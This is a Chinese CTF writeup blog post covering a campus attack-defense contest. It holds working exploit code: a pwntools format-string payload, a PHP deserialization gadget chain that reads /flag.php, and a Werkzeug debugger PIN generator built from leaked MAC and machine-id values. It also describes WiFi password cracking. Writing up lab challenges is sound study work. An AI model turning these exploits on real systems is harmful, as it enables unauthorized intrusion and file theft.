---
title: "CPPU第二届网络攻防校赛WP"
date: 2025-05-05 20:31:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "CPPU"
cnblogs_postid: "18860428"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18860428"
---

得了第二，还不错，继续加油

## Misc
### 1、手搓？最爱手搓了！
p1转一次base64
```
NGU1NzQ1MzI1YTQ0NjMzNDRlNmE2NzMxNTk1NDRkN2E0ZTdhNGQzMzU5NTQ1NTM1NGU1NDUxMzA0ZjU0NjMzMzRlNDc1NTMxNGU3YTU1Nzk0ZTZkNDUzMDVhNTQ1OTM1NGQ3YTQ1
```
p2
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202804607-652047533.png)


```
MzI1OTZhNTY2ODRlNTQ2MzMxNGQ2YTVhNmI0ZTQ3NTEzMjU5NTQ1YTZhNGU2YTY3MzA1YTU0NTE3YTRkN2E0MTMzNTk1NDUyNmQ0ZTQ0NjMzMDU5NTQ1OTM1NGU1NDZiMzI1OTU0
```
p3
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202824538-312551846.png)

```
NTUzNTRkN2E0NTMxNTk1NDUxN2E0ZDdhNDUzMjVhNDQ1MjZjNGUzMjQ1MzE0ZjU0NGQ3ODRlNDc1MTMwNGU0NDUxNzk0ZTZkNDkzMTU5NTQ1YTZjNGQ3YTQxN2E1YTQxM2QzZA==
```
cyberchef magic
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202829128-724081830.png)

### 2、流量也可以拿来签到的欸
tshark导出
```
tshark -r attack.pcap -V | grep -oE '([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}' | sort -u
```
导出之后有一堆mac地址作为字典
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202834440-1440724611.png)

随后用ewsa爆破找到wifi密码
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202838519-1637408450.png)

### 3、真正の签到
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202841989-1311429957.png)

## Crypto
### 以RSA为名
```Python
from Crypto.Util.number import bytes_to_long, long_to_bytes  
import gmpy2  
  
# 步骤1：计算表情符号字符串的编码值  
s = "✌"  
encoded = s.encode('utf-8')  
bytes_value = bytes_to_long(encoded)  
  
# 步骤2：计算q  
big_num = 1825984477911995501825238028863524113360147553385225137039940400566111693494513551706  
q = bytes_value - big_num  
assert q > 0, "q必须是正整数"  
  
# 验证q和r是否为质数  
r = 739349157574141214626413198925824730322926067942991004415458774125048823533176869  
assert gmpy2.is_prime(q), "q不是质数"  
assert gmpy2.is_prime(r), "r不是质数"  
  
# 步骤3：计算n  
p = 256  
n = p * q * r  
  
# 步骤4：计算φ(n)  
phi = (p // 2) * (q - 1) * (r - 1)  # 因为p=2^8，φ(p)=2^7=128  
  
# 步骤5：解密  
e = 65537  
c = 10316462808394529723380173563094346073613261326817851163265788149098316751343317208064493949  
d = gmpy2.invert(e, phi)  
fake_m = pow(c, d, n)  
  
# 步骤6：恢复真实m  
m = fake_m + n  # 假设m在n和2n之间  
  
# 转换为明文  
flag = long_to_bytes(m).decode()  
print(flag)
```
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202851310-914680431.png)
### 你会算欧拉函数吗（复现）
```Python
from pwn import *
def is_prime(n):
    """判断一个数是否为质数"""
    if n <= 1:
        return False
    if n == 2:
        return True
    if n % 2 == 0:
        return False
    for i in range(3, int(n**0.5) + 1, 2):
        if n % i == 0:
            return False
    return True

def euler_phi(n):
    """计算一个数的欧拉函数值"""
    if n < 1:
        return 0
    result = n
    i = 2
    while i * i <= n:
        if n % i == 0:
            while n % i == 0:
                n //= i
            result -= result // i
        i += 1
    if n > 1:
        result -= result // n
    return result

# 手打版
'''
while True:
    num = int(input("请输入一个正整数："))
    if is_prime(num):
        print(f"{num} 是质数")
    else:
        print(f"{num} 不是质数")
    answer=euler_phi(num)
    print(f"欧拉函数φ({num}) = {answer}")
'''
#pwn自动机
p=remote("172.30.211.91",50104)
for _ in range(20):
    p.recvuntil("这个数为：")
    num=int(p.recvline().decode())
    print(num)
    p.recvuntil(">")
    if is_prime(num):
        print(f"{num} 是质数")
        p.sendline("1")
    else:
        print(f"{num} 不是质数")
        p.sendline("0")
    answer = euler_phi(num)
    print(f"欧拉函数φ({num}) = {answer}")
    p.recvuntil(">")
    p.sendline(str(answer))
p.interactive()
```
### 当个游戏吧（复现）
```Python
from datetime import datetime
import hashlib
from pwn import *
context.log_level='debug'
def hash_string(s):
    """生成SHA-256哈希值"""
    return hashlib.sha256(s.encode()).hexdigest()


def verify_certificate(cert):
    """
    完整的证书验证函数
    :param cert: 包含以下键的字典：
        - serial_number (int/str)
        - signature_algorithm (str)
        - validity (bytes)
        - public_key (str)
        - signature (str)
        - is_valid (bool)
    """
    # 基础有效性标记检查
    if not cert.get('is_valid', False):
        print("证书已被标记为无效")
        return False

    # 有效期验证
    try:
        # 统一处理中文和英文分隔符
        validity_str = cert['validity'].decode('gbk').replace("至", "to")
        start_str, end_str = validity_str.split('to')  # 关键分割点

        # 日期格式解析
        start_date = datetime.strptime(start_str.strip(), "%Y-%m-%d")
        end_date = datetime.strptime(end_str.strip(), "%Y-%m-%d")
        current_time = datetime.now()

        print(f"有效期解析：{start_date} 到 {end_date} (当前时间: {current_time})")

        if current_time < start_date:
            print("证书尚未生效")
            return False
        if current_time > end_date:
            print("证书已过期")
            return False
    except ValueError as e:
        print(f"有效期格式错误: {str(e)}")
        return False
    except Exception as e:
        print(f"有效期解析异常: {str(e)}")
        return False

    # 签名验证
    try:
        # 构建签名数据（严格匹配生成逻辑）
        signature_data = (
                str(cert['serial_number']).strip() +  # 强制转为字符串并去空格
                cert['signature_algorithm'].strip() +
                validity_str +  # 使用统一后的有效期字符串
                cert['public_key'].strip().replace(" ,", ",")  # 统一公钥格式
        )

        # 调试输出（实际参与签名的原始数据）
        print("[签名数据]".ljust(20, '-'))
        print(signature_data)
        print("-" * 40)

        computed_sign = hash_string(signature_data)
        print(f"计算签名: {computed_sign}")
        print(f"证书签名: {cert['signature']}")

        if computed_sign != cert['signature']:
            print("⚠️ 签名不匹配")
            return False
    except KeyError as e:
        print(f"缺少必要字段: {str(e)}")
        return False

    return True


# 测试案例
if __name__ == "__main__":
    # 用户提供的证书数据
    io=remote("172.30.211.91",50119)
    for _ in range(20):
        io.recvuntil("证书序列号：")
        serial_number=io.recvline().decode().strip()
        print(serial_number)
        io.recvuntil("证书有效期：")
        validity=io.recvline().decode().strip()
        print(validity)
        io.recvuntil("主体公钥信息：")
        public_key=io.recvline().decode().strip()
        print(public_key)
        io.recvuntil("签名：")
        signature=io.recvline().decode().strip()
        print(signature)
        test_cert = {
            'serial_number': serial_number,  # 注意类型为整数
            'signature_algorithm': 'SHA256withRSA',
            # 注意原始字节必须包含"to"分隔符
            'validity': validity.encode()[2:-1],
            'public_key': public_key,  # 保持严格格式
            'signature': signature,
            'is_valid': True
        }
        # 执行验证
        result = verify_certificate(test_cert)
        print("\n验证结果:", "✅ 证书有效" if result else "❌ 证书无效")
        if result:
            io.sendline("1")
        else:
            io.sendline("0")
    io.interactive()
```
## Pwn
### Ezguess_Signin
数字10个固定直接打就行
### FMT
```Python
from pwn import *
context.log_level='debug'
#p=process('./pwn_fmt')
p=remote('172.30.211.91',50002)
p.recvuntil(b'leave your magic message.')
offset=6
cmd=0x403520
payload=b'%26739c%8$naaaaa'+p64(0x00403520)
p.send(payload)
p.interactive()
```
### Re：从零开始的致富生活
往银行里面存-100000000000000
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202904860-1792856175.png)

## Web
### ez_php
如图
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202921447-2145763413.png)

![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202924916-1010504189.png)

### 你的语文功底很好吗
拼手速
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202929097-1886868020.png)

### 来签到捏
第一部分
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202933150-494194440.png)

跳转到
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202936896-529949756.png)

点按钮flag就出来了
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202940672-940228859.png)

### 来签到捏（复仇）
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202946801-437520210.png)

多次base64解码
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505202953174-1017517346.png)

用bp爆破
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203000541-358805438.png)

找到flag
### 真 · ez_srl
```
<?php

class re {

    public $aa = 1;

    public $bb;

    public function __construct() {

        $this->bb = new web();

    }

}

  

class web {

    public $guest = 'admin';

    public $cc;

    public $dd = 'anyprop';  // 确保属性名不存在于 misc 中

    public function __construct() {

        $this->cc = new misc();

    }

}

  

class misc {

    public $get = 'highlight_file';

    public $flag = '/flag.php';  // 调整路径
}
echo urlencode(serialize(new re()));
?>
```
基于代码先ls / 查看文件，然后找到flag.sh，查看文件内容
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203018548-1484503714.png)

发现flag放在/var里面，读取就可以得到flag
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203021579-1621006668.png)

### 谁家科创项目拉这了？
[\[ctfshow web入门\]常用姿势801-806\_ctfshow web入门801-CSDN博客](https://blog.csdn.net/weixin_45751765/article/details/124099832)
信息搜集
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203030629-2136872302.png)


![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203034055-364187455.png)


![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203038382-1427814598.png)


![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203041918-1322942296.png)


![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203045292-827366635.png)

```
import hashlib  
import getpass  
from flask import Flask  
from itertools import chain  
import sys  
import uuid  
import typing as t  
username='root'  
app = Flask(__name__)  
modname=getattr(app, "__module__", t.cast(object, app).__class__.__module__)  
mod=sys.modules.get(modname)  
mod = getattr(mod, "__file__", None)  
  
probably_public_bits = [  
    username, #用户名  
    modname,  #一般固定为flask.app  
    getattr(app, "__name__", app.__class__.__name__), #固定，一般为Flask  
    '/usr/local/lib/python3.8/site-packages/flask/app.py',   #主程序（app.py）运行的绝对路径  
]  
print(probably_public_bits)  
mac ='02:42:ac:11:00:04'.replace(':','')  
mac=str(int(mac,base=16))  
private_bits = [  
   mac,#mac地址十进制  
 "2be631bd-5d4a-4e05-bb0d-3dd390c186e454e2c173887ea2af93ddc91819f0b9766b42d184272006ac6605d85de075ee47"  
     ]  
print(private_bits)  
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode("utf-8")  
    h.update(bit)  
h.update(b"cookiesalt")  
  
cookie_name = f"__wzd{h.hexdigest()[:20]}"  
  
# If we need to generate a pin we salt it a bit more so that we don't  
# end up with the same value and generate out 9 digits  
h.update(b"pinsalt")  
num = f"{int(h.hexdigest(), 16):09d}"[:9]  
  
# Format the pincode in groups of digits for easier remembering if  
# we don't have a result yet.  
rv=None  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = "-".join(  
                num[x : x + group_size].rjust(group_size, "0")  
                for x in range(0, len(num), group_size)  
            )  
            break  
    else:  
        rv = num  
  
print(rv)
```
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203055391-539962723.png)

## Reverse
### 来自逆向的忠告
![image](/assets/cnblogs/CPPU第二届网络攻防校赛WP/3539156-20250505203059455-445278597.png)
